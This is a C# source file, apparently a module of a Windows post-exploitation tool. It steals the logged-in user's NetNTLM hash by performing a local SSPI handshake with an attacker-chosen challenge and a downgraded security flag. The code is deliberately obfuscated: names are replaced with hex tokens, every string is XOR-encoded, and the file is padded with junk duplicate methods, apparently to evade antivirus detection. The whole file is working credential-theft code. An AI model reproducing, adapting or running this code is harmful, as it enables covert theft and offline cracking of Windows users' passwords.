using O_F41F88FA.Util;
using System;
using System.Collections.Generic;
using System.Text;
using O_F41F88FA.Interop;
using static O_F41F88FA.Interop.Secur32;
using System.Linq;
using System.Threading.Tasks;

namespace O_F41F88FA.Commands.Windows
{
internal class O_C039B850 : O_2183A68D
{
    public override string Command => Encoding.UTF8.GetString(Convert.FromBase64String("W32gQXbkGGxvfYBjcuMA").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("CBjDEReHcw0=")[iii % 8])).ToArray());
    public override string Description => Encoding.UTF8.GetString(Convert.FromBase64String("RFuo05Svm2ZoS7nWmK+cL2pVr5Kbs4crK0q50YizgTJyGazTnqqJIW5K").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("Czncsv3B6EY=")[iii % 8])).ToArray());
    public override CommandGroup[] Group => new[]
    {
        CommandGroup.User
    };
    public override bool SupportRemote => false;

    public Runtime ThisRunTime;
    private const int MAX_TOKEN_SIZE = 12288;
    private const uint SEC_E_OK = 0;
    private const uint SEC_E_NO_CREDENTIALS = 0x8009030e;
    private const uint SEC_I_CONTINUE_NEEDED = 0x90312;
    public O_C039B850(Runtime runtime) : base(runtime)
    {
        ThisRunTime = runtime;
    }

    public override IEnumerable<O_4AED570F?> Execute(string[] args)
    {
        var challenge = Encoding.UTF8.GetString(Convert.FromBase64String("cNuoeQrwyDN036x9DvTEPw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("QeqaSznD/Ac=")[iii % 8])).ToArray());
        if (args.Length > 0)
            challenge = args[0];
        yield return GetNtlmCreds(challenge, true);
    }

    private O_C30E6D93? GetNtlmCreds(string challenge, bool DisableESS)
    {
        var clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
        var newClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
        var serverToken = new SecBufferDesc(MAX_TOKEN_SIZE);
        SECURITY_HANDLE cred;
        cred.LowPart = cred.HighPart = IntPtr.Zero;
        SECURITY_HANDLE clientContext;
        clientContext.LowPart = clientContext.HighPart = IntPtr.Zero;
        SECURITY_HANDLE newClientContext;
        newClientContext.LowPart = newClientContext.HighPart = IntPtr.Zero;
        SECURITY_HANDLE serverContext;
        serverContext.LowPart = serverContext.HighPart = IntPtr.Zero;
        SECURITY_INTEGER clientLifeTime;
        clientLifeTime.LowPart = clientLifeTime.HighPart = IntPtr.Zero;
        try
        {
            var result = Secur32.AcquireCredentialsHandle(IntPtr.Zero, Encoding.UTF8.GetString(Convert.FromBase64String("IIzNpg==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("btiB61WDdVo=")[iii % 8])).ToArray()), 3, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref cred, ref clientLifeTime);
            if (result != SEC_E_OK)
                throw new Exception($"AcquireCredentialsHandle failed. Error: 0x{result:x8}");
            result = Secur32.InitializeSecurityContext(ref cred, IntPtr.Zero, IntPtr.Zero, 0x00000800, 0, 0x10, IntPtr.Zero, 0, out clientContext, out clientToken, out _, out clientLifeTime);
            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                throw new Exception($"InitializeSecurityContext failed. Error: 0x{result:x8}");
            result = AcceptSecurityContext(ref cred, IntPtr.Zero, ref clientToken, 0x00000800, 0x10, out serverContext, out serverToken, out _, out clientLifeTime);
            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                throw new Exception($"AcceptSecurityContext failed. Error: 0x{result:x8}");
            var serverMessage = serverToken.ToArray();
            var challengeBytes = StringToByteArray(challenge);
            if (DisableESS)
            {
                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
            }

            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
            Array.Copy(new byte[16], 0, serverMessage, 32, 16);
            var newServerToken = new SecBufferDesc(serverMessage);
            result = InitializeSecurityContext(ref cred, ref clientContext, IntPtr.Zero, 0x00000800, 0, 0x10, ref newServerToken, 0, out newClientContext, out newClientToken, out _, out clientLifeTime);
            var clientTokenBytes = newClientToken.ToArray();
            newServerToken.Dispose();
            if (result == SEC_E_OK)
                return ParseNTResponse(clientTokenBytes, challenge);
            else if (result == SEC_E_NO_CREDENTIALS)
            {
                WriteVerbose(Encoding.UTF8.GetString(Convert.FromBase64String("GriAJr4k6eBuo4BlhQLM2TfwlWeTG8TKK/CBaZUDhcMhpMVlnx7RzCe+xWeeCYXOPLWBY54EzMwiow==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TtDlBvBwpa0=")[iii % 8])).ToArray()));
                return null;
            }
            else if (DisableESS)
            {
                return GetNtlmCreds(challenge, false);
            }
            else
                throw new Exception($"InitializeSecurityContext (client) failed. Error: 0x{result:x8}");
        }
        catch (Exception e)
        {
            throw e;
        }
        finally
        {
            clientToken.Dispose();
            newClientToken.Dispose();
            serverToken.Dispose();
            if (cred.LowPart != IntPtr.Zero && cred.HighPart != IntPtr.Zero)
                FreeCredentialsHandle(ref cred);
            if (clientContext.LowPart != IntPtr.Zero && clientContext.HighPart != IntPtr.Zero)
                DeleteSecurityContext(ref clientContext);
            if (newClientContext.LowPart != IntPtr.Zero && newClientContext.HighPart != IntPtr.Zero)
                DeleteSecurityContext(ref newClientContext);
            if (serverContext.LowPart != IntPtr.Zero && serverContext.HighPart != IntPtr.Zero)
                DeleteSecurityContext(ref serverContext);
        }
    }

    private O_C30E6D93 ParseNTResponse(byte[] message, string challenge)
    {
        var lm_resp_len = BitConverter.ToUInt16(message, 12);
        var lm_resp_off = BitConverter.ToUInt32(message, 16);
        var nt_resp_len = BitConverter.ToUInt16(message, 20);
        var nt_resp_off = BitConverter.ToUInt32(message, 24);
        var domain_len = BitConverter.ToUInt16(message, 28);
        var domain_off = BitConverter.ToUInt32(message, 32);
        var user_len = BitConverter.ToUInt16(message, 36);
        var user_off = BitConverter.ToUInt32(message, 40);
        var lm_resp = new byte[lm_resp_len];
        var nt_resp = new byte[nt_resp_len];
        var domain = new byte[domain_len];
        var user = new byte[user_len];
        Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
        Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
        Array.Copy(message, domain_off, domain, 0, domain_len);
        Array.Copy(message, user_off, user, 0, user_len);
        if (nt_resp_len == 24)
        {
            return new O_C30E6D93(Encoding.UTF8.GetString(Convert.FromBase64String("LD9r0S3+2QtT").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("Ylofn3mylH0=")[iii % 8])).ToArray()), FormatNetNtlmV1Hash(challenge, user, domain, lm_resp, nt_resp));
        }
        else if (nt_resp_len > 24)
        {
            return new O_C30E6D93(Encoding.UTF8.GetString(Convert.FromBase64String("wTUo0NHjj829").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("j1BcnoWvwrs=")[iii % 8])).ToArray()), FormatNetNtlmV2Hash(challenge, user, domain, nt_resp.SubArray(0, 16), nt_resp.SubArray(16, nt_resp.Length - 16)));
        }
        else
        {
            throw new Exception($"Couldn't parse nt_resp. Len: {nt_resp_len} Message bytes: {ByteArrayToString(message)}");
        }
    }

    private string FormatNetNtlmV1Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp)
    {
        return string.Format(Encoding.UTF8.GetString(Convert.FromBase64String("8NGlojgnsquxmurlOCewq7Ga7OU=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("i+HYmAJcg9Y=")[iii % 8])).ToArray()), Encoding.Unicode.GetString(user), Encoding.Unicode.GetString(domain), ByteArrayToString(lm_resp), ByteArrayToString(nt_resp), challenge);
    }

    private string FormatNetNtlmV2Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp)
    {
        return string.Format(Encoding.UTF8.GetString(Convert.FromBase64String("yRLOW8j1Fd2IWYEcyPUX3YhZhxw=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("siKzYfKOJKA=")[iii % 8])).ToArray()), Encoding.Unicode.GetString(user), Encoding.Unicode.GetString(domain), challenge, ByteArrayToString(lm_resp), ByteArrayToString(nt_resp));
    }

    public static byte[] StringToByteArray(string hex)
    {
        var numChars = hex.Length;
        var bytes = new byte[numChars / 2];
        for (var i = 0; i < numChars; i += 2)
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        return bytes;
    }

    private string ByteArrayToString(byte[] ba)
    {
        var hex = new StringBuilder(ba.Length * 2);
        foreach (var b in ba)
            hex.AppendFormat(Encoding.UTF8.GetString(Convert.FromBase64String("ItdjzYWl").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("WedZtbfYMm8=")[iii % 8])).ToArray()), b);
        return hex.ToString();
    }

    public IEnumerable<O_4AED570F?> Execute(string[] args, string TUIxbVYw)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var challenge = Encoding.UTF8.GetString(Convert.FromBase64String("cNuoeQrwyDN036x9DvTEPw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("QeqaSznD/Ac=")[iii % 8])).ToArray());
        if (args.Length > 0)
            challenge = args[0];
        yield return GetNtlmCreds(challenge, true);
    }

    private O_C30E6D93? GetNtlmCreds(string challenge, bool DisableESS, string brlhTFxw)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
        var newClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
        var serverToken = new SecBufferDesc(MAX_TOKEN_SIZE);
        SECURITY_HANDLE cred;
        cred.LowPart = cred.HighPart = IntPtr.Zero;
        SECURITY_HANDLE clientContext;
        clientContext.LowPart = clientContext.HighPart = IntPtr.Zero;
        SECURITY_HANDLE newClientContext;
        newClientContext.LowPart = newClientContext.HighPart = IntPtr.Zero;
        SECURITY_HANDLE serverContext;
        serverContext.LowPart = serverContext.HighPart = IntPtr.Zero;
        SECURITY_INTEGER clientLifeTime;
        clientLifeTime.LowPart = clientLifeTime.HighPart = IntPtr.Zero;
        try
        {
            var result = Secur32.AcquireCredentialsHandle(IntPtr.Zero, Encoding.UTF8.GetString(Convert.FromBase64String("IIzNpg==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("btiB61WDdVo=")[iii % 8])).ToArray()), 3, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref cred, ref clientLifeTime);
            if (result != SEC_E_OK)
                throw new Exception($"AcquireCredentialsHandle failed. Error: 0x{result:x8}");
            result = Secur32.InitializeSecurityContext(ref cred, IntPtr.Zero, IntPtr.Zero, 0x00000800, 0, 0x10, IntPtr.Zero, 0, out clientContext, out clientToken, out _, out clientLifeTime);
            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                throw new Exception($"InitializeSecurityContext failed. Error: 0x{result:x8}");
            result = AcceptSecurityContext(ref cred, IntPtr.Zero, ref clientToken, 0x00000800, 0x10, out serverContext, out serverToken, out _, out clientLifeTime);
            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                throw new Exception($"AcceptSecurityContext failed. Error: 0x{result:x8}");
            var serverMessage = serverToken.ToArray();
            var challengeBytes = StringToByteArray(challenge);
            if (DisableESS)
            {
                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
            }

            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
            Array.Copy(new byte[16], 0, serverMessage, 32, 16);
            var newServerToken = new SecBufferDesc(serverMessage);
            result = InitializeSecurityContext(ref cred, ref clientContext, IntPtr.Zero, 0x00000800, 0, 0x10, ref newServerToken, 0, out newClientContext, out newClientToken, out _, out clientLifeTime);
            var clientTokenBytes = newClientToken.ToArray();
            newServerToken.Dispose();
            if (result == SEC_E_OK)
                return ParseNTResponse(clientTokenBytes, challenge);
            else if (result == SEC_E_NO_CREDENTIALS)
            {
                WriteVerbose(Encoding.UTF8.GetString(Convert.FromBase64String("GriAJr4k6eBuo4BlhQLM2TfwlWeTG8TKK/CBaZUDhcMhpMVlnx7RzCe+xWeeCYXOPLWBY54EzMwiow==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TtDlBvBwpa0=")[iii % 8])).ToArray()));
                return null;
            }
            else if (DisableESS)
            {
                return GetNtlmCreds(challenge, false);
            }
            else
                throw new Exception($"InitializeSecurityContext (client) failed. Error: 0x{result:x8}");
        }
        catch (Exception e)
        {
            throw e;
        }
        finally
        {
            clientToken.Dispose();
            newClientToken.Dispose();
            serverToken.Dispose();
            if (cred.LowPart != IntPtr.Zero && cred.HighPart != IntPtr.Zero)
                FreeCredentialsHandle(ref cred);
            if (clientContext.LowPart != IntPtr.Zero && clientContext.HighPart != IntPtr.Zero)
                DeleteSecurityContext(ref clientContext);
            if (newClientContext.LowPart != IntPtr.Zero && newClientContext.HighPart != IntPtr.Zero)
                DeleteSecurityContext(ref newClientContext);
            if (serverContext.LowPart != IntPtr.Zero && serverContext.HighPart != IntPtr.Zero)
                DeleteSecurityContext(ref serverContext);
        }
    }

    private O_C30E6D93 ParseNTResponse(byte[] message, string challenge, string bmrdOMis)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var lm_resp_len = BitConverter.ToUInt16(message, 12);
        var lm_resp_off = BitConverter.ToUInt32(message, 16);
        var nt_resp_len = BitConverter.ToUInt16(message, 20);
        var nt_resp_off = BitConverter.ToUInt32(message, 24);
        var domain_len = BitConverter.ToUInt16(message, 28);
        var domain_off = BitConverter.ToUInt32(message, 32);
        var user_len = BitConverter.ToUInt16(message, 36);
        var user_off = BitConverter.ToUInt32(message, 40);
        var lm_resp = new byte[lm_resp_len];
        var nt_resp = new byte[nt_resp_len];
        var domain = new byte[domain_len];
        var user = new byte[user_len];
        Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
        Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
        Array.Copy(message, domain_off, domain, 0, domain_len);
        Array.Copy(message, user_off, user, 0, user_len);
        if (nt_resp_len == 24)
        {
            return new O_C30E6D93(Encoding.UTF8.GetString(Convert.FromBase64String("LD9r0S3+2QtT").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("Ylofn3mylH0=")[iii % 8])).ToArray()), FormatNetNtlmV1Hash(challenge, user, domain, lm_resp, nt_resp));
        }
        else if (nt_resp_len > 24)
        {
            return new O_C30E6D93(Encoding.UTF8.GetString(Convert.FromBase64String("wTUo0NHjj829").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("j1BcnoWvwrs=")[iii % 8])).ToArray()), FormatNetNtlmV2Hash(challenge, user, domain, nt_resp.SubArray(0, 16), nt_resp.SubArray(16, nt_resp.Length - 16)));
        }
        else
        {
            throw new Exception($"Couldn't parse nt_resp. Len: {nt_resp_len} Message bytes: {ByteArrayToString(message)}");
        }
    }

    private string FormatNetNtlmV1Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp, string LSNDFtSD)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        return string.Format(Encoding.UTF8.GetString(Convert.FromBase64String("8NGlojgnsquxmurlOCewq7Ga7OU=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("i+HYmAJcg9Y=")[iii % 8])).ToArray()), Encoding.Unicode.GetString(user), Encoding.Unicode.GetString(domain), ByteArrayToString(lm_resp), ByteArrayToString(nt_resp), challenge);
    }

    private string FormatNetNtlmV2Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp, string jfPhTDvT)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        return string.Format(Encoding.UTF8.GetString(Convert.FromBase64String("yRLOW8j1Fd2IWYEcyPUX3YhZhxw=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("siKzYfKOJKA=")[iii % 8])).ToArray()), Encoding.Unicode.GetString(user), Encoding.Unicode.GetString(domain), challenge, ByteArrayToString(lm_resp), ByteArrayToString(nt_resp));
    }

    public static byte[] StringToByteArray(string hex, string nQZZiQnA)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var numChars = hex.Length;
        var bytes = new byte[numChars / 2];
        for (var i = 0; i < numChars; i += 2)
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        return bytes;
    }

    private string ByteArrayToString(byte[] ba, string JjhBezYG)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Threading.HostExecutionContext instance = new System.Threading.HostExecutionContext();
                    instance.Dispose(false);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var hex = new StringBuilder(ba.Length * 2);
        foreach (var b in ba)
            hex.AppendFormat(Encoding.UTF8.GetString(Convert.FromBase64String("ItdjzYWl").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("WedZtbfYMm8=")[iii % 8])).ToArray()), b);
        return hex.ToString();
    }
}internal class O_C30E6D93 : O_4AED570F
{
    public O_C30E6D93(string version, string hash)
    {
        Version = version;
        Hash = hash;
    }

    public string Version { get; }
    public string Hash { get; }
}}